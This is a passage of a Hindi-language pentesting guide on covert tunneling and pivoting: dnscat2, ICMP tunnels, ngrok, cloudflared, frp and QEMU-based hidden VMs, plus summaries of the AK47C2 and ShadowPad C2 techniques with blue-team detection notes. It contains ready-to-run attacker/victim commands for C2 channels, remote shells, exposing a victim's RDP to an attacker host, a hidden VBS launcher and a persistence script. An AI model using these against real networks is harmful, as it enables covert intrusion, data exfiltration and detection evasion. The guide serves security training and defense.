[**इसे यहाँ से Download करें**](https://github.com/iagox86/dnscat2)**।**

Dnscat2 DNS के माध्यम से एक encrypted command-and-control channel स्थापित करता है; नीचे दिए गए server और client commands इसके documented usage का पालन करते हैं।<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell में**

आप PowerShell में dnscat2 client चलाने के लिए [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) का उपयोग कर सकते हैं; इसका README नीचे दिखाए गए `Start-Dnscat2` parameters का दस्तावेज़ीकरण करता है।<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat के साथ Port forwarding**

Dnscat2 का interactive `listen` command एक local listener को remote host और port पर map करता है।<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Change proxychains DNS

Proxychains-ng dynamically linked TCP connections को hook करता है और UDP या ICMP को carry नहीं कर सकता; DNS proxying configurable है, इसलिए किसी fixed public resolver को मानने के बजाय installed `proxychains.conf` और resolver helper का निरीक्षण करें। Legacy `proxyresolv` scripts resolver चुनने के लिए `PROXY_DNS_SERVER` expose करती हैं; जब internal names आवश्यक हों, तो pivot से reachable resolver का उपयोग करें।<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor ने एक **dual-channel C2 ("AK47C2")** बनाया, जो *केवल* outbound **DNS** और **plain HTTP POST** traffic का दुरुपयोग करता है – ये दो protocols corporate networks पर rarely blocked होते हैं।<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• एक random 5-character SessionID generate करता है (जैसे `H4T14`)।
• *task requests* के लिए `1` या *results* के लिए `2` prepend करता है और अलग-अलग fields (flags, SessionID, computer name) को concatenate करता है।
• प्रत्येक field को ASCII key `VHBD@H` के साथ **XOR-encrypt**, hex-encode और dots के साथ जोड़ दिया जाता है – अंत में attacker-controlled domain जोड़ा जाता है:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests **TXT** (और fallback **MG**) records के लिए `DnsQuery()` का उपयोग करती हैं।
• जब response 0xFF bytes से अधिक हो जाता है, तो backdoor data को 63-byte pieces में **fragments** करता है और markers डालता है:
`s<SessionID>t<TOTAL>p<POS>` ताकि C2 server उन्हें फिर से क्रम में लगा सके।

2. **HTTP mode (AK47HTTP)**
• एक JSON envelope बनाता है:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• पूरे blob को XOR-`VHBD@H` → hex किया जाता है → और header `Content-Type: text/plain` के साथ **`POST /`** के body के रूप में भेजा जाता है।
• Reply उसी encoding का अनुसरण करता है और `cmd` field को `cmd.exe /c <command> 2>&1` के साथ execute किया जाता है।

Blue Team notes
• ऐसे असामान्य **TXT queries** खोजें जिनका पहला label लंबा hexadecimal हो और जो हमेशा एक rare domain पर समाप्त हों।
• ASCII-hex के बाद constant XOR key को YARA से आसानी से detect किया जा सकता है: `6?56484244?484` (`VHBD@H` hex में)।
• HTTP के लिए ऐसे text/plain POST bodies को flag करें जो pure hex हों और जिनकी लंबाई दो bytes का multiple हो।

{{#note}}
यह channel प्रत्येक sub-domain label को 63-octet DNS limit के भीतर रखता है, लेकिन protocol compliance अकेले इसे stealthy नहीं बनाती; rare domains, लंबे hexadecimal labels और query volume अभी भी detection signals बने रहते हैं।<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans एक TUN device और ICMP echo requests का उपयोग करने वाले IPv4-over-ICMP tunnel को document करता है; setup के लिए interface create करने हेतु पर्याप्त privileges आवश्यक हैं।<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**इसे यहाँ से Download करें**](https://github.com/utoni/ptunnel-ng.git)।

ptunnel-ng TCP connections को ICMP के ऊपर transport करता है और नीचे दिखाए गए `-p`, `-l`, `-r`, और `-R` options का उपयोग क्रमशः proxy, local listener, destination host और destination port के लिए करता है।<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) एक agent है, जो secure tunnel के माध्यम से local network services को online उपलब्ध कराता है; इसका CLI HTTP, TCP और file URL endpoints का documentation प्रदान करता है, और printed endpoint hostname endpoint तथा account के अनुसार अलग-अलग हो सकता है।<sup>[[39]](#references)</sup>

### Installation

- एक account बनाएँ: https://ngrok.com/signup
- Client download:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### मूल उपयोग

**दस्तावेज़ीकरण:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_ज़रूरत पड़ने पर agent authentication और TLS विकल्पों का भी समर्थन करता है।<sup>[[39]](#references)</sup>_

#### TCP Tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP के साथ files को expose करना
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP calls की Sniffing

_XSS,SSRF,SSTI आदि के लिए उपयोगी_\
standalone agent डिफ़ॉल्ट रूप से अपना HTTP inspection interface `http://127.0.0.1:4040` पर उपलब्ध कराता है; यह interface HTTP traffic के लिए है।<sup>[[40]](#references)</sup>

#### Internal HTTP service की Tunneling

`--host-header=rewrite` option upstream HTTP `Host` header को local service से match करने के लिए rewrite करता है।<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml का सरल configuration उदाहरण

यह ngrok Agent Config v2 का उपयोग करता है; named tunnels में `proto` और `addr` का उपयोग होता है और इन्हें `ngrok start` के साथ शुरू किया जाता है।<sup>[[42]](#references)</sup> यह 3 tunnels खोलता है:

- 2 TCP
- /tmp/httpbin/ से static files exposition वाला 1 HTTP tunnel
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel का `cloudflared` connector outbound connections स्थापित करता है; published applications HTTP, HTTPS, TCP, SSH और RDP को route कर सकती हैं, जबकि quick tunnels का उद्देश्य HTTP development है।<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin (legacy mode)

पुराना `--socks5` flag `cloudflared` को बताता है कि local origin SOCKS5 पर communicate करता है; यह local SOCKS5 listener create नहीं करता। Managed tunnel के लिए, `originRequest.proxyType: socks` SOCKS5 origin handling configure करता है।<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### DNS के साथ Persistent tunnels

स्थानीय रूप से प्रबंधित tunnel configuration में नीचे दिखाए गए lower-case `tunnel`, `credentials-file`, और `url` keys का उपयोग किया जाता है।<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
कनेक्टर शुरू करें:
```bash
cloudflared tunnel run mytunnel
```
Connector outbound connections स्थापित करता है और, default रूप से, fallback के रूप में HTTP/2 के साथ QUIC negotiate करता है; यह न मानें कि हर deployment TCP/443 का उपयोग करता है। इसे केवल आपके deployment के लिए आवश्यक privileges के साथ चलाएँ।<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) एक Go reverse proxy है, जो **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, और XTCP** को support करता है। XTCP P2P hole punching का उपयोग करता है, जिसकी सफलता NAT पर निर्भर करती है। **v0.53.0** से यह **SSH Tunnel Gateway** के रूप में काम कर सकता है, इसलिए target host `frpc` binary के बिना stock OpenSSH client का उपयोग कर सकता है।<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### नए SSH gateway का उपयोग (no frpc binary)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
उपरोक्त command stock OpenSSH client का उपयोग करके victim के **8080** port को **attacker_ip:9000** के रूप में publish करता है, जबकि `frps` gateway प्रदान करता है।<sup>[[50]](#references)</sup>

## QEMU-आधारित गुप्त Tunnels

QEMU user-mode networking को virtual network के लिए root या administrator privilege की आवश्यकता नहीं होती, और `-netdev user,hostfwd=...` host से guest तक TCP, UDP या UNIX connections को redirect करता है।<sup>[[51]](#references)</sup> TrustedSec ने एक incident में Tiny Core QEMU VM और attempted reverse SSH tunnel का documentation किया, जहाँ host-focused EDR guest के अंदर की activity को miss कर सकता था।<sup>[[1]](#references)</sup>

### Quick one-liner
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• ऊपर दिया गया command 256 MiB guest memory और qcow2 disk image के साथ **Tiny Core Linux** guest लॉन्च करता है; disk image in-RAM disk नहीं है।
• Windows host का port **2222/tcp**, guest के अंदर के **22/tcp** पर transparently forward किया जाता है।
• attacker के दृष्टिकोण से target केवल port 2222 expose करता है; वहाँ पहुँचने वाले सभी packets VM में चल रहे SSH server द्वारा handle किए जाते हैं।

### VBScript के माध्यम से stealthily लॉन्च करना

TrustedSec ने ऊपर उल्लिखित incident में VBS-driven QEMU launches और Tiny Core images देखीं।<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs` के साथ script चलाने पर window hidden रहती है।<sup>[[1]](#references)</sup>

### Guest के अंदर persistence

उद्धृत incident में stateless Tiny Core guest में `/opt/bootlocal.sh` और `/opt/filetool.lst` के माध्यम से persistence का वर्णन किया गया है:<sup>[[1]](#references)</sup>

1. Payload को `/opt/123.out` में drop करें
2. `/opt/bootlocal.sh` में जोड़ें:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `/opt/filetool.lst` में `home/tc` और `opt` जोड़ें, ताकि shutdown के समय payload को `mydata.tgz` में pack किया जा सके।

### Telemetry संबंधी विचार

• Host पर QEMU process, qcow2 image और host-forwarded listener अभी भी दिखाई देते हैं।
• केवल host पर किए गए process scans guest processes का निरीक्षण नहीं कर सकते, लेकिन virtualization से evasion की गारंटी नहीं मिलती; network, QEMU और image telemetry इसे उजागर कर सकते हैं।<sup>[[1]](#references)[[51]](#references)</sup>

### Defender के लिए सुझाव

• User-writable paths में **unexpected QEMU/VirtualBox/KVM binaries** पर alert करें।
• `qemu-system*.exe` से originate होने वाले outbound connections को block करें।
• ऐसे rare listening ports (2222, 10022, …) के लिए hunt करें जो QEMU launch के तुरंत बाद bind होते हैं।

## `HttpAddUrl` के माध्यम से IIS/HTTP.sys relay nodes (ShadowPad)

Check Point के अनुसार ShadowPad का IIS module, `HttpAddUrl` के माध्यम से URL prefixes bind करके compromised perimeter web servers को backdoor और relay nodes में बदलता है।<sup>[[3]](#references)</sup>

उसी report में defaults, wildcard listeners, packet decryption, relay queues और नीचे summarize की गई debug telemetry का विवरण दिया गया है।<sup>[[3]](#references)</sup>

* **Config defaults** – यदि module का JSON config कोई value छोड़ देता है, तो यह विश्वसनीय IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`) पर fallback करता है। इस तरह benign traffic का उत्तर IIS सही branding के साथ देता है।
* **Wildcard interception** – Operators URL prefixes की semicolon-separated list देते हैं (host + path में wildcards)। Module प्रत्येक entry के लिए `HttpAddUrl` call करता है, इसलिए HTTP.sys matching requests को malicious handler पर route करता है; nonmatching requests सामान्य IIS behavior पर fallback करती हैं।
* **Encrypted first packet** – Request body के पहले दो bytes custom 32-bit PRNG के लिए seed रखते हैं। Protocol parsing से पहले प्रत्येक subsequent byte को generated keystream के साथ XOR किया जाता है:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – Module दो lists maintain करता है: “servers” (upstream nodes) और “clients” (downstream implants)। यदि लगभग 30 seconds के भीतर heartbeat नहीं आता, तो entries को prune कर दिया जाता है। जब दोनों lists non-empty होती हैं, तो यह पहले healthy server को पहले healthy client के साथ pair करता है और एक side के close होने तक उनके sockets के बीच bytes को simply pipe करता है।
* **Debug telemetry** – Optional logging प्रत्येक pairing के लिए source IP, destination IP और total forwarded bytes record करती है। Investigators ने इन breadcrumbs का उपयोग कई victims में फैले ShadowPad mesh को rebuild करने के लिए किया।

---

## जांचने के लिए अन्य tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Bypass Firewall/IDS Restrictions](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScale source repository](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: A CDN-Fronted Tailnet from a BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
{{#include ../banners/hacktricks-training.md}}
